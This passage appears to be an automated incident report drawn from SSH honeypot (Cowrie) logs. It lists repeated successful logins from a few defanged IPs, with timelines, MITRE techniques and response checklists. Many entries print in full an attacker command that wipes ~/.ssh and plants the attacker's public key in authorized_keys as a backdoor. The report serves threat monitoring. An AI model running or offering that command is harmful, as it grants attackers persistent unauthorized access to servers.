| `2026-05-04 15:12:51` | `cowrie.command.input` |
| `2026-05-04 15:12:51` | `cowrie.session.file_download` |
| `2026-05-04 15:12:51` | `cowrie.log.closed` |
| `2026-05-04 15:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af685b91a7f0

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:12 |
| **Last Seen** | 2026-05-04 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:12:54` | `cowrie.session.connect` |
| `2026-05-04 15:12:54` | `cowrie.client.version` |
| `2026-05-04 15:12:54` | `cowrie.client.kex` |
| `2026-05-04 15:12:54` | `cowrie.login.success` |
| `2026-05-04 15:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6356b91ad002

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:17 |
| **Last Seen** | 2026-05-04 15:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:17:33` | `cowrie.session.connect` |
| `2026-05-04 15:17:33` | `cowrie.client.version` |
| `2026-05-04 15:17:33` | `cowrie.client.kex` |
| `2026-05-04 15:17:34` | `cowrie.login.success` |
| `2026-05-04 15:17:34` | `cowrie.session.params` |
| `2026-05-04 15:17:34` | `cowrie.command.input` |
| `2026-05-04 15:17:34` | `cowrie.command.failed` |
| `2026-05-04 15:17:34` | `cowrie.log.closed` |
| `2026-05-04 15:17:34` | `cowrie.session.params` |
| `2026-05-04 15:17:34` | `cowrie.command.input` |
| `2026-05-04 15:17:34` | `cowrie.session.file_download` |
| `2026-05-04 15:17:34` | `cowrie.log.closed` |
| `2026-05-04 15:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82683d0019e3

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:17 |
| **Last Seen** | 2026-05-04 15:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:17:36` | `cowrie.session.connect` |
| `2026-05-04 15:17:36` | `cowrie.client.version` |
| `2026-05-04 15:17:37` | `cowrie.client.kex` |
| `2026-05-04 15:17:37` | `cowrie.login.success` |
| `2026-05-04 15:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eb50903beb6

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:22 |
| **Last Seen** | 2026-05-04 15:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:22:17` | `cowrie.session.connect` |
| `2026-05-04 15:22:17` | `cowrie.client.version` |
| `2026-05-04 15:22:17` | `cowrie.client.kex` |
| `2026-05-04 15:22:17` | `cowrie.login.success` |
| `2026-05-04 15:22:18` | `cowrie.session.params` |
| `2026-05-04 15:22:18` | `cowrie.command.input` |
| `2026-05-04 15:22:18` | `cowrie.command.failed` |
| `2026-05-04 15:22:18` | `cowrie.log.closed` |
| `2026-05-04 15:22:18` | `cowrie.session.params` |
| `2026-05-04 15:22:18` | `cowrie.command.input` |
| `2026-05-04 15:22:18` | `cowrie.session.file_download` |
| `2026-05-04 15:22:18` | `cowrie.log.closed` |
| `2026-05-04 15:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-043ef6613e15

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:22 |
| **Last Seen** | 2026-05-04 15:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:22:20` | `cowrie.session.connect` |
| `2026-05-04 15:22:20` | `cowrie.client.version` |
| `2026-05-04 15:22:21` | `cowrie.client.kex` |
| `2026-05-04 15:22:21` | `cowrie.login.success` |
| `2026-05-04 15:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4ce639cced

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:27 |
| **Last Seen** | 2026-05-04 15:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:27:00` | `cowrie.session.connect` |
| `2026-05-04 15:27:00` | `cowrie.client.version` |
| `2026-05-04 15:27:00` | `cowrie.client.kex` |
| `2026-05-04 15:27:00` | `cowrie.login.success` |
| `2026-05-04 15:27:01` | `cowrie.session.params` |
| `2026-05-04 15:27:01` | `cowrie.command.input` |
| `2026-05-04 15:27:01` | `cowrie.command.failed` |
| `2026-05-04 15:27:01` | `cowrie.log.closed` |
| `2026-05-04 15:27:01` | `cowrie.session.params` |
| `2026-05-04 15:27:01` | `cowrie.command.input` |
| `2026-05-04 15:27:01` | `cowrie.session.file_download` |
| `2026-05-04 15:27:01` | `cowrie.log.closed` |
| `2026-05-04 15:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24843d934d54

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:27 |
| **Last Seen** | 2026-05-04 15:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:27:03` | `cowrie.session.connect` |
| `2026-05-04 15:27:03` | `cowrie.client.version` |
| `2026-05-04 15:27:03` | `cowrie.client.kex` |
| `2026-05-04 15:27:04` | `cowrie.login.success` |
| `2026-05-04 15:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01044732afaa

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:31 |
| **Last Seen** | 2026-05-04 15:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:31:44` | `cowrie.session.connect` |
| `2026-05-04 15:31:44` | `cowrie.client.version` |
| `2026-05-04 15:31:44` | `cowrie.client.kex` |
| `2026-05-04 15:31:45` | `cowrie.login.success` |
| `2026-05-04 15:31:45` | `cowrie.session.params` |
| `2026-05-04 15:31:45` | `cowrie.command.input` |
| `2026-05-04 15:31:45` | `cowrie.command.failed` |
| `2026-05-04 15:31:45` | `cowrie.log.closed` |
| `2026-05-04 15:31:46` | `cowrie.session.params` |
| `2026-05-04 15:31:46` | `cowrie.command.input` |
| `2026-05-04 15:31:46` | `cowrie.session.file_download` |
| `2026-05-04 15:31:46` | `cowrie.log.closed` |
| `2026-05-04 15:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-017a81a45abc

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:31 |
| **Last Seen** | 2026-05-04 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:31:48` | `cowrie.session.connect` |
| `2026-05-04 15:31:48` | `cowrie.client.version` |
| `2026-05-04 15:31:48` | `cowrie.client.kex` |
| `2026-05-04 15:31:48` | `cowrie.login.success` |
| `2026-05-04 15:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-221176be2a6c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-04 15:40 |
| **Last Seen** | 2026-05-04 15:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:40:07` | `cowrie.session.connect` |
| `2026-05-04 15:40:07` | `cowrie.client.version` |
| `2026-05-04 15:40:07` | `cowrie.client.kex` |
| `2026-05-04 15:40:08` | `cowrie.login.success` |
| `2026-05-04 15:40:09` | `cowrie.session.params` |
| `2026-05-04 15:40:09` | `cowrie.command.input` |
| `2026-05-04 15:40:09` | `cowrie.command.failed` |
| `2026-05-04 15:40:09` | `cowrie.log.closed` |
| `2026-05-04 15:40:10` | `cowrie.session.params` |
| `2026-05-04 15:40:10` | `cowrie.command.input` |
| `2026-05-04 15:40:10` | `cowrie.session.file_download` |
| `2026-05-04 15:40:10` | `cowrie.log.closed` |
| `2026-05-04 15:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ecea86adce5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-04 15:40 |
| **Last Seen** | 2026-05-04 15:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:40:14` | `cowrie.session.connect` |
| `2026-05-04 15:40:14` | `cowrie.client.version` |
| `2026-05-04 15:40:14` | `cowrie.client.kex` |
| `2026-05-04 15:40:15` | `cowrie.login.success` |
| `2026-05-04 15:40:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a10dfe710e88

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:50 |
| **Last Seen** | 2026-05-04 15:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:50:43` | `cowrie.session.connect` |
| `2026-05-04 15:50:43` | `cowrie.client.version` |
| `2026-05-04 15:50:43` | `cowrie.client.kex` |
| `2026-05-04 15:50:44` | `cowrie.login.success` |
| `2026-05-04 15:50:44` | `cowrie.session.params` |
| `2026-05-04 15:50:44` | `cowrie.command.input` |
| `2026-05-04 15:50:44` | `cowrie.command.failed` |
| `2026-05-04 15:50:44` | `cowrie.log.closed` |
| `2026-05-04 15:50:45` | `cowrie.session.params` |
| `2026-05-04 15:50:45` | `cowrie.command.input` |
| `2026-05-04 15:50:45` | `cowrie.session.file_download` |
| `2026-05-04 15:50:45` | `cowrie.log.closed` |
| `2026-05-04 15:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b304a1601f

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 15:50 |
| **Last Seen** | 2026-05-04 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 15:50:47` | `cowrie.session.connect` |
| `2026-05-04 15:50:47` | `cowrie.client.version` |
| `2026-05-04 15:50:47` | `cowrie.client.kex` |
| `2026-05-04 15:50:48` | `cowrie.login.success` |
| `2026-05-04 15:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1677d819e582

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:00 |
| **Last Seen** | 2026-05-04 16:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:00:12` | `cowrie.session.connect` |
| `2026-05-04 16:00:12` | `cowrie.client.version` |
| `2026-05-04 16:00:12` | `cowrie.client.kex` |
| `2026-05-04 16:00:13` | `cowrie.login.success` |
| `2026-05-04 16:00:13` | `cowrie.session.params` |
| `2026-05-04 16:00:13` | `cowrie.command.input` |
| `2026-05-04 16:00:13` | `cowrie.command.failed` |
| `2026-05-04 16:00:13` | `cowrie.log.closed` |
| `2026-05-04 16:00:13` | `cowrie.session.params` |
| `2026-05-04 16:00:13` | `cowrie.command.input` |
| `2026-05-04 16:00:13` | `cowrie.session.file_download` |
| `2026-05-04 16:00:13` | `cowrie.log.closed` |
| `2026-05-04 16:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104f88b56e8a

| Field | Detail |
|---|---|
| **Source IP** | `222.110.147[.]56` |
| **First Seen** | 2026-05-04 16:00 |
| **Last Seen** | 2026-05-04 16:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:00:16` | `cowrie.session.connect` |
| `2026-05-04 16:00:16` | `cowrie.client.version` |
| `2026-05-04 16:00:16` | `cowrie.client.kex` |
| `2026-05-04 16:00:16` | `cowrie.login.success` |
| `2026-05-04 16:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.110.147[.]56` to AbuseIPDB if not already reported
- [ ] Block `222.110.147[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f23588495967

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-05-04 16:04 |
| **Last Seen** | 2026-05-04 16:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:04:05` | `cowrie.session.connect` |
| `2026-05-04 16:04:05` | `cowrie.client.version` |
| `2026-05-04 16:04:05` | `cowrie.client.kex` |
| `2026-05-04 16:04:06` | `cowrie.login.success` |
| `2026-05-04 16:04:06` | `cowrie.session.params` |
| `2026-05-04 16:04:06` | `cowrie.command.input` |
| `2026-05-04 16:04:06` | `cowrie.command.failed` |
| `2026-05-04 16:04:06` | `cowrie.log.closed` |
| `2026-05-04 16:04:06` | `cowrie.session.params` |
| `2026-05-04 16:04:06` | `cowrie.command.input` |
| `2026-05-04 16:04:06` | `cowrie.session.file_download` |
| `2026-05-04 16:04:06` | `cowrie.log.closed` |
| `2026-05-04 16:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-071d3182cac6

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-05-04 16:04 |
| **Last Seen** | 2026-05-04 16:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 16:04:08` | `cowrie.session.connect` |
| `2026-05-04 16:04:08` | `cowrie.client.version` |
| `2026-05-04 16:04:08` | `cowrie.client.kex` |
| `2026-05-04 16:04:08` | `cowrie.login.success` |
| `2026-05-04 16:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.168.135[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.168.135[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2a4460088ec

| Field | Detail |
|---|---|
| **Source IP** | `103.168.135[.]187` |
| **First Seen** | 2026-05-04 16:04 |
| **Last Seen** | 2026-05-04 16:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
